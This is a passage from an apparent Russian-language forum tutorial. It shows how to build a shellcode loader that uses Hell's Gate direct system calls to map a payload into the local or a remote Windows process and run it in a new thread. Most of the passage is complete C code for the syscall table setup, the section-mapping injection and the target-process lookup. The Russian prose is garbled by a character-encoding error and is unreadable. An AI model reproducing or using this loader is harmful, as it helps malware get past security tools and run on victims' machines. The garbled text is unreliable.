–ü–æ—Å–ª–µ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –∏ –∑–∞–ø—É—Å–∫–∞ –ø—Ä–æ–≥—Ä–∞–º–º–∞ —Å–≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —Å–ª–µ–¥—É—é—â–∏–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã, –∫–æ—Ç–æ—Ä—ã–µ —Å–ª–µ–¥—É–µ—Ç —Å–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ —Ñ–∞–π–ª Common.h.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788161753.png"
		data-src="https://osint42.org/attachments/1746788161753-png.262/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788161753-png.262/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788161753.png"
			title="1746788161753.png"
			width="1048" height="194" loading="lazy" />
	</div><br />
<br />
–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ, –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –Ω–æ–≤–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã VX_TABLE –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–æ, —á—Ç–æ–±—ã –≤–∫–ª—é—á–∏—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã, –∫–æ—Ç–æ—Ä—ã–µ –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _VX_TABLE {

    VX_TABLE_ENTRY NtCreateSection;
    VX_TABLE_ENTRY NtMapViewOfSection;
    VX_TABLE_ENTRY NtUnmapViewOfSection;
    VX_TABLE_ENTRY NtClose;
    VX_TABLE_ENTRY NtCreateThreadEx;
    VX_TABLE_ENTRY NtWaitForSingleObject;

} VX_TABLE, * PVX_TABLE;</code></pre>
	</div>
</div><br />
<b>–í–Ω–µ–¥—Ä–µ–Ω–∏–µ Payload —á–µ—Ä–µ–∑ Hell&#039;s Gate</b><br />
<br />
–ü–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–π –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ Hell&#039;s Gate –º–æ–∂–Ω–æ –ø—Ä–∏—Å—Ç—É–ø–∏—Ç—å –∫ –≤–Ω–µ–¥—Ä–µ–Ω–∏—é Payload. –°–æ–∑–¥–∞–µ—Ç—Å—è –Ω–æ–≤—ã–π —Ñ–∞–π–ª Inject.c, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω –Ω–∏–∂–µ.<br />
<br />
<b>–°–ª–µ–¥—É—é—â–∏–µ –ø—É–Ω–∫—Ç—ã –∫—Ä–∞—Ç–∫–æ –æ–±—ä—è—Å–Ω—è—é—Ç —Ñ–∞–π–ª Inject.c:</b><br />
<ol>
<li data-xf-list-type="ol">InitializeSyscalls - –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ—Ç –≥–ª–æ–±–∞–ª—å–Ω—É—é –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é g_Sys —Ç–∏–ø–∞ VX_TABLE, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –ø–æ–∑–∂–µ.</li>
<li data-xf-list-type="ol">RemoteMappingInjectionViaSyscalls - –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –∫–∞–∫ –ª–æ–∫–∞–ª—å–Ω–æ–µ, —Ç–∞–∫ –∏ —É–¥–∞–ª–µ–Ω–Ω–æ–µ –∏–Ω—ä–µ–∫—Ü–∏—é —á–µ—Ä–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä bLocal, –∫–æ—Ç–æ—Ä—ã–π —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –≤ TRUE –¥–ª—è –ª–æ–∫–∞–ª—å–Ω–æ–π –∏–Ω—ä–µ–∫—Ü–∏–∏ –∏ –≤ FALSE –¥–ª—è —É–¥–∞–ª–µ–Ω–Ω–æ–π –∏–Ω—ä–µ–∫—Ü–∏–∏.</li>
<li data-xf-list-type="ol">–ï—Å–ª–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä bLocal —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ TRUE, –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è dwLocalFlag –±—É–¥–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –≤ PAGE_EXECUTE_READWRITE, —á—Ç–æ–±—ã –±—ã—Ç—å –ø–æ–¥—Ö–æ–¥—è—â–µ–π –¥–ª—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è Payload, –∏ –≤—Ç–æ—Ä–æ–π –≤—ã–∑–æ–≤ NtMapViewOfSection –±—É–¥–µ—Ç –∏–∑–±–µ–≥–∞—Ç—å—Å—è. –ù–æ –µ—Å–ª–∏ bLocal —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ FALSE, dwLocalFlag –æ—Å—Ç–∞–Ω–µ—Ç—Å—è PAGE_READWRITE, –∏ —Ñ—É–Ω–∫—Ü–∏—è –≤—ã–ø–æ–ª–Ω–∏—Ç –≤—Ç–æ—Ä–æ–π –≤—ã–∑–æ–≤ NtMapViewOfSection –¥–ª—è –≤—ã–¥–µ–ª–µ–Ω–∏—è –ø–∞–º—è—Ç–∏ —É–¥–∞–ª–µ–Ω–Ω–æ.</li>
<li data-xf-list-type="ol">–ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è pExecAddress –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –±–∞–∑–æ–≤–æ–≥–æ –∞–¥—Ä–µ—Å–∞ –≤–Ω–µ–¥—Ä–µ–Ω–Ω–æ–≥–æ Payload. –û–Ω–∞ —Ä–∞–≤–Ω–∞ –±–∞–∑–æ–≤–æ–º—É –∞–¥—Ä–µ—Å—É –ª–æ–∫–∞–ª—å–Ω–æ –≤–Ω–µ–¥—Ä–µ–Ω–Ω–æ–≥–æ Payload (pLocalAddress), –µ—Å–ª–∏ —Ñ—É–Ω–∫—Ü–∏—è –Ω–∞—Å—Ç—Ä–æ–µ–Ω–∞ –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ Payload –ª–æ–∫–∞–ª—å–Ω–æ, –∏–ª–∏ –±–∞–∑–æ–≤–æ–º—É –∞–¥—Ä–µ—Å—É —É–¥–∞–ª–µ–Ω–Ω–æ –≤–Ω–µ–¥—Ä–µ–Ω–Ω–æ–≥–æ Payload (pRemoteAddress), –µ—Å–ª–∏ —Ñ—É–Ω–∫—Ü–∏—è –Ω–∞—Å—Ç—Ä–æ–µ–Ω–∞ –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ Payload —É–¥–∞–ª–µ–Ω–Ω–æ.</li>
<li data-xf-list-type="ol">–ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è pExecAddress –∑–∞—Ç–µ–º –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è –≤ —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ NtCreateThreadEx –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è Payload –≤ –Ω—É–∂–Ω—ã–π –º–æ–º–µ–Ω—Ç –≤—Ä–µ–º–µ–Ω–∏.</li>
</ol>
	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#include &quot;Structs.h&quot;
#include &quot;Common.h&quot;

// –ì–ª–æ–±–∞–ª—å–Ω–∞—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ VX_TABLE
VX_TABLE g_Sys = { 0 };

BOOL InitializeSyscalls() {

    // –ü–æ–ª—É—á–∏—Ç—å PEB
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
        return FALSE;

    // –ü–æ–ª—É—á–∏—Ç—å –º–æ–¥—É–ª—å NTDLL
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

    // –ü–æ–ª—É—á–∏—Ç—å EAT NTDLL
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
        return FALSE;

    g_Sys.NtCreateSection.uHash = NtCreateSection_JOAA;
    g_Sys.NtMapViewOfSection.uHash = NtMapViewOfSection_JOAA;
    g_Sys.NtUnmapViewOfSection.uHash = NtUnmapViewOfSection_JOAA;
    g_Sys.NtClose.uHash = NtClose_JOAA;
    g_Sys.NtCreateThreadEx.uHash = NtCreateThreadEx_JOAA;
    g_Sys.NtWaitForSingleObject.uHash = NtWaitForSingleObject_JOAA;

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateSection))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtMapViewOfSection))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtUnmapViewOfSection))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtClose))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateThreadEx))
        return FALSE;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtWaitForSingleObject))
        return FALSE;

    return TRUE;
}

BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal) {

        HANDLE          hSection          = NULL;
        HANDLE          hThread           = NULL;
        PVOID           pLocalAddress     = NULL,
                        pRemoteAddress    = NULL,
                        pExecAddress      = NULL;
        NTSTATUS        STATUS            = NULL;
        SIZE_T          sViewSize         = NULL;
        LARGE_INTEGER   MaximumSize       = {
              .HighPart = 0,
              .LowPart = sPayloadSize
        };

        DWORD           dwLocalFlag       = PAGE_READWRITE;

    //--------------------------------------------------------------------------
    // –í—ã–¥–µ–ª–µ–Ω–∏–µ –ª–æ–∫–∞–ª—å–Ω–æ–π –∫–∞—Ä—Ç—ã
    HellsGate(g_Sys.NtCreateSection.wSystemCall);
    if ((STATUS = HellDescent(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    if (bLocal) {
        dwLocalFlag = PAGE_EXECUTE_READWRITE;
    }

    HellsGate(g_Sys.NtMapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, dwLocalFlag)) != 0) {
        printf(&quot;[!] NtMapViewOfSection [L] –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] –õ–æ–∫–∞–ª—å–Ω–∞—è –ø–∞–º—è—Ç—å –≤—ã–¥–µ–ª–µ–Ω–∞ –ø–æ –∞–¥—Ä–µ—Å—É: 0x%p —Ä–∞–∑–º–µ—Ä–æ–º : %d \n&quot;, pLocalAddress, sViewSize);

    //--------------------------------------------------------------------------
    // –ó–∞–ø–∏—Å—å Payload
    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –∑–∞–ø–∏—Å–∞—Ç—å Payload ... &quot;);
    getchar();
    memcpy(pLocalAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] Payload —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω —Å 0x%p –ø–æ 0x%p \n&quot;, pPayload, pLocalAddress);

    //--------------------------------------------------------------------------
        // –í—ã–¥–µ–ª–µ–Ω–∏–µ —É–¥–∞–ª–µ–Ω–Ω–æ–π –∫–∞—Ä—Ç—ã
        if (!bLocal) {

          HellsGate(g_Sys.NtMapViewOfSection.wSystemCall);
          if ((STATUS = HellDescent(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
            printf(&quot;[!] NtMapViewOfSection [R] –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π : 0x%0.8X \n&quot;, STATUS);
            return FALSE;
          }

          printf(&quot;[+] –£–¥–∞–ª–µ–Ω–Ω–∞—è –ø–∞–º—è—Ç—å –≤—ã–¥–µ–ª–µ–Ω–∞ –ø–æ –∞–¥—Ä–µ—Å—É: 0x%p —Ä–∞–∑–º–µ—Ä–æ–º : %d \n&quot;, pRemoteAddress, sViewSize);

        }

    //--------------------------------------------------------------------------
    // –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ Payload —á–µ—Ä–µ–∑ —Å–æ–∑–¥–∞–Ω–∏–µ –ø–æ—Ç–æ–∫–∞
    pExecAddress = pRemoteAddress;
    if (bLocal) {
        pExecAddress = pLocalAddress;
    }
    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –≤—ã–ø–æ–ª–Ω–∏—Ç—å Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] –ó–∞–ø—É—Å–∫ –ø–æ—Ç–æ–∫–∞ —Å –Ω–∞—á–∞–ª—å–Ω—ã–º –∞–¥—Ä–µ—Å–æ–º 0x%p ... &quot;, pExecAddress);
    HellsGate(g_Sys.NtCreateThreadEx.wSystemCall);
    if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pExecAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] –ì–æ—Ç–æ–≤–æ \n&quot;);
    printf(&quot;\t[+] –°–æ–∑–¥–∞–Ω –ø–æ—Ç–æ–∫ —Å –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–æ–º : %d \n&quot;, GetThreadId(hThread));

    //--------------------------------------------------------------------------
    // –û–∂–∏–¥–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞
    HellsGate(g_Sys.NtWaitForSingleObject.wSystemCall);
    if ((STATUS = HellDescent(hThread, FALSE, NULL)) != 0) {
        printf(&quot;[!] NtWaitForSingleObject –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // –û—Ç–º–µ–Ω–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –≤–∏–¥–∞
    HellsGate(g_Sys.NtUnmapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent((HANDLE)-1, pLocalAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // –ó–∞–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ä–∞–∑–¥–µ–ª–∞
    HellsGate(g_Sys.NtClose.wSystemCall);
    if ((STATUS = HellDescent(hSection)) != 0) {
        printf(&quot;[!] NtClose –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–ü–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤</b><br />
<br />
–î–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –ø–æ–ª–Ω–æ–≥–æ –º–æ–¥—É–ª—è –≤–Ω–µ–¥—Ä–µ–Ω–∏—è –≤ –ø—Ä–æ—Ü–µ—Å—Å –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ NtQuerySystemInformation –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –∫–∞–∫ –æ–ø–∏—Å–∞–Ω–æ –≤ –º–æ–¥—É–ª–µ Process Enumeration - NtQuerySystemInformation.<br />
<br />
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –Ω–æ–≤–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –ø–æ—Ç—Ä–µ–±—É–µ—Ç –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã VX_TABLE, —á—Ç–æ–±—ã –≤–∫–ª—é—á–∏—Ç—å –µ—â–µ –æ–¥–∏–Ω —ç–ª–µ–º–µ–Ω—Ç, VX_TABLE_ENTRY.<br />
NtQuerySystemInformation, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω —Ñ—É–Ω–∫—Ü–∏–µ–π InitializeSyscalls. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø—Ä–æ–≥—Ä–∞–º–º—É Hasher –¥–ª—è –≤—ã—á–∏—Å–ª–µ–Ω–∏—è —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏—è –¥–ª—è —Å—Ç—Ä–æ–∫–∏ &quot;NtQuerySystemInformation&quot;.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess) {

    ULONG                        uReturnLen1         = NULL,
                                uReturnLen2         = NULL;
    PSYSTEM_PROCESS_INFORMATION  SystemProcInfo     = NULL;
    PVOID                        pValueToFree     = NULL;
    NTSTATUS                    STATUS             = NULL;

    // –≠—Ç–æ –Ω–µ—É–¥–∞—á–∞ —Å–æ —Å—Ç–∞—Ç—É—Å–æ–º = STATUS_INFO_LENGTH_MISMATCH, –Ω–æ —ç—Ç–æ –Ω–æ—Ä–º–∞–ª—å–Ω–æ, –ø–æ—Ç–æ–º—É —á—Ç–æ –Ω–∞–º –Ω—É–∂–Ω–æ —É–∑–Ω–∞—Ç—å, —Å–∫–æ–ª—å–∫–æ –Ω—É–∂–Ω–æ –≤—ã–¥–µ–ª–∏—Ç—å (uReturnLen1)
    HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
    HellDescent(SystemProcessInformation, NULL, NULL, &amp;uReturnLen1);

    // –í—ã–¥–µ–ª–µ–Ω–∏–µ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ–≥–æ –±—É—Ñ–µ—Ä–∞ –¥–ª—è –≤–æ–∑–≤—Ä–∞—â–∞–µ–º–æ–≥–æ –º–∞—Å—Å–∏–≤–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä SYSTEM_PROCESS_INFORMATION
    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
    if (SystemProcInfo == NULL) {
        return FALSE;
    }

    // –ü–æ—Å–∫–æ–ª—å–∫—É –º—ã –±—É–¥–µ–º –∏–∑–º–µ–Ω—è—Ç—å &#039;SystemProcInfo&#039;, –º—ã —Å–æ—Ö—Ä–∞–Ω—è–µ–º –µ–≥–æ –Ω–∞—á–∞–ª—å–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –ø–µ—Ä–µ–¥ —Ü–∏–∫–ª–æ–º while, —á—Ç–æ–±—ã –ø–æ–∑–∂–µ –æ—Å–≤–æ–±–æ–¥–∏—Ç—å –µ–≥–æ
    pValueToFree = SystemProcInfo;

    // –í—ã–∑–æ–≤ NtQuerySystemInformation —Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º–∏ –∞—Ä–≥—É–º–µ–Ω—Ç–∞–º–∏, –≤—ã–≤–æ–¥ –±—É–¥–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ &#039;SystemProcInfo&#039;
    HellsGate(g_Sys.NtQuerySystemInformation.wSystemCall);
    STATUS = HellDescent(SystemProcessInformation, SystemProcInfo, uReturnLen1, &amp;uReturnLen2);
    if (STATUS != 0x0) {
        printf(&quot;[!] NtQuerySystemInformation –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    while (TRUE) {

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–∞–∑–º–µ—Ä–∞ –∏–º–µ–Ω–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞
        // –°—Ä–∞–≤–Ω–µ–Ω–∏–µ –∏–º–µ–Ω–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å —Ü–µ–ª—å—é
        if (SystemProcInfo-&gt;ImageName.Length &amp;&amp; HASHW(SystemProcInfo-&gt;ImageName.Buffer) == HASHW(szProcName)) {
            // –û—Ç–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –µ–≥–æ, –∑–∞—Ç–µ–º –≤—ã—Ö–æ–¥
            *pdwPid = (DWORD)SystemProcInfo-&gt;UniqueProcessId;
            *phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo-&gt;UniqueProcessId);
            break;
        }

        // –ï—Å–ª–∏ NextEntryOffset —Ä–∞–≤–µ–Ω 0, –º—ã –¥–æ—Å—Ç–∏–≥–ª–∏ –∫–æ–Ω—Ü–∞ –º–∞—Å—Å–∏–≤–∞
        if (!SystemProcInfo-&gt;NextEntryOffset)
            break;

        // –ü–µ—Ä–µ—Ö–æ–¥ –∫ —Å–ª–µ–¥—É—é—â–µ–º—É —ç–ª–µ–º–µ–Ω—Ç—É –≤ –º–∞—Å—Å–∏–≤–µ
        SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo-&gt;NextEntryOffset);
    }

    // –û—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏, –∏—Å–ø–æ–ª—å–∑—É—è –Ω–∞—á–∞–ª—å–Ω—ã–π –∞–¥—Ä–µ—Å
    HeapFree(GetProcessHeap(), 0, pValueToFree);

    // –ü—Ä–æ–≤–µ—Ä–∫–∞, –ø–æ–ª—É—á–µ–Ω –ª–∏ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞
    if (*pdwPid == NULL || *phProcess == NULL)
        return FALSE;
    else
        return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è</b><br />
<br />
–î–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –∫–æ–¥–∞ —Å–æ–∑–¥–∞–π—Ç–µ main.c, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ—á–∫—É –≤—Ö–æ–¥–∞ –∑–∞–≥—Ä—É–∑—á–∏–∫–∞, –∞ —Ç–∞–∫–∂–µ –æ–±—ã—á–Ω—É—é –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É Msfvenom calc.<br />
<br />
<b>–û–±—ä—è—Å–Ω–µ–Ω–∏–µ —á—Ç–æ –¥–µ–ª–∞–µ—Ç—Å—è –≤ –æ—Å–Ω–æ–≤–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏:</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è InitializeSyscalls - —ç—Ç–æ –ø–µ—Ä–≤–∞—è –≤—ã–∑—ã–≤–∞–µ–º–∞—è —Ñ—É–Ω–∫—Ü–∏—è.<br />
–í—Å–µ –æ—Å—Ç–∞–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –∑–∞–≤–∏—Å—è—Ç –æ—Ç –Ω–µ–µ –¥–ª—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤.<br />
–ï—Å–ª–∏ TARGET_PROCESS –æ–ø—Ä–µ–¥–µ–ª–µ–Ω, –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏—è GetRemoteProcessHandle –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ —Ü–µ–ª–µ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏ –ø–µ—Ä–µ–¥–∞—á–∏ –µ–≥–æ –≤—ã–≤–æ–¥–∞ –≤ RemoteMappingInjectionViaSyscalls. –ï—Å–ª–∏ TARGET_PROCESS –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω, –∫–æ–¥ –Ω–µ–ø–æ—Å—Ä–µ–¥—Å—Ç–≤–µ–Ω–Ω–æ –≤—ã–∑—ã–≤–∞–µ—Ç RemoteMappingInjectionViaSyscalls —Å –ø—Å–µ–≤–¥–æ-–∑–Ω–∞—á–µ–Ω–∏–µ–º –¥–ª—è –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ (1), —É–∫–∞–∑—ã–≤–∞—è –≤–Ω–µ–¥—Ä–∏—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É 